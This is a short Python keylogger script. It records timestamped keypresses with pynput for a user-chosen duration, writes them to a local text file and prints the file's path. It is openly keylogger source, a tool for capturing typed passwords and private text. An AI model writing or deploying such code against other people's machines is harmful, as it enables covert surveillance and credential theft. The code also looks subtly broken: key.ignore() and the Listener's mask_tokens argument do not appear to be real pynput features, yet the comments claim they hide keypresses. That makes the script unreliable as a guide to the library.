import pynput
import time
import os
from getpass import getpass

# Defines the log file path
log_file_path = "keylogger_log.txt"

# Defines the keylogger function
def keylogger(key):
    # Consume the keyboard event to prevent it from being displayed on the screen
    key.ignore()

    # Format the timestamp and key press event
    timestamp = time.strftime("%Y-%m-%d %H:%M:%S", time.localtime())
    event = f"{timestamp} - {key}\n"

    # Writes the event to the log file
    with open(log_file_path, "a") as log_file:
        log_file.write(event)

# Prompts the user to enter the duration for which the keystrokes should be logged
log_duration = int(input("Enter the duration (in seconds) for which the keystrokes should be logged: "))

# Sets up the keylogger listener with the mask_tokens parameter to hide key presses from the screen
listener = pynput.keyboard.Listener(on_press=keylogger, mask_tokens=[pynput.keyboard.Key.cmd, pynput.keyboard.Key.ctrl])
listener.start()

# Runs the keylogger for the specified duration
start_time = time.time()
end_time = start_time + log_duration

while time.time() < end_time:
    time.sleep(1)

# Stops the keylogger listener
listener.stop()

# Displays the log file path
print("\nThe log file has been saved to:", os.path.abspath(log_file_path))